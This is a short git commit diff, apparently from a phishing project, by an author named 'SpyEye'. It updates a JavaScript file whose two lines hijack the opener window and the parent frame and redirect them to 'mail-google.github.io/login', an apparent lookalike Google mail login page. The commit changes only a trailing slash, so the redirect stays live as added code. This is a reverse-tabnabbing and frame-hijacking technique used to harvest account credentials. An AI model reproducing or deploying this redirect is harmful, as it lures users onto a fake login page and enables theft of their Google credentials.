e1170badb648a39f02aecff5c88d341a09e55522
SpyEye <103291965+spyeyee@users.noreply.github.com>
2022-04-14 01:34:18 +0600

    Update js.js

--- js.js
+++ js.js
@@ -1,2 +1,2 @@
-if (window.opener) window.opener.parent.location.replace('https://mail-google.github.io/login/');
-if (window.parent != window) window.parent.location.replace('https://mail-google.github.io/login/');
+if (window.opener) window.opener.parent.location.replace('https://mail-google.github.io/login');
+if (window.parent != window) window.parent.location.replace('https://mail-google.github.io/login');
